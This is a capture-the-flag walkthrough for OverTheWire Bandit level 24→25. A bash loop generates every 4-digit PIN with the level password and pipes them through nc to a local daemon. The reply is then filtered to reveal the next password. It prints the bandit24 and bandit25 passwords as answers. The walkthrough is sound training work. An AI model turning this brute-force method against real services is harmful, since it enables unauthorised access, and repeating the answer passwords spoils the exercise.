# [Bandit Level 24 → Level 25](https://overthewire.org/wargames/bandit/bandit25.html)

## Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. 
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time.

## Theory
For this level we need to generate all possible 4-digit pincodes and pass to the daemon on port 30002.
This can be done by creating a bash script and implementing a for loop. The loop will go from `0000` to `9999` and in each iteration pass the pin to the daemon.

## Solution
1. First lets see how the daemon responds when we enter any random 4-digit pincode. Use the `nc` command to connect.
```
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
1927
Wrong! Please enter the correct current password and pincode. Try again.
```
2. So the daemon responds with a statement each time you enter a pincode. So, we need a file to write all the results in. This writing process can also be implemented in the script file.
NOTE: press ctrl+C to exit the daemon and return to cli.
3. Create a script like the following:
```
#!/bin/bash
for i in {0000..9999}
do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> trail.txt
done
cat trail.txt | nc localhost 30002 > result.txt
```
4. First we create a file called `trail.txt` which contains the lines `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000` upto `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999`.
5. Then this file is given to `nc localhost 30002` and the result is copied in `result.txt`
6. Now that we have the result for all possible 4-digit pins from 0000 to 9999, we need to find the line which doesnt start with 'Wrong!'. Since this will contain the correct pin and so will return the password.
7. Use `sort` and then `grep` with `-v` flag to return everything execpt the lines with 'Wrong!'.
```
bandit24@bandit:/tmp/tmp.eHVsAsdAaV$ sort result.txt | grep -v "Wrong!"

Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
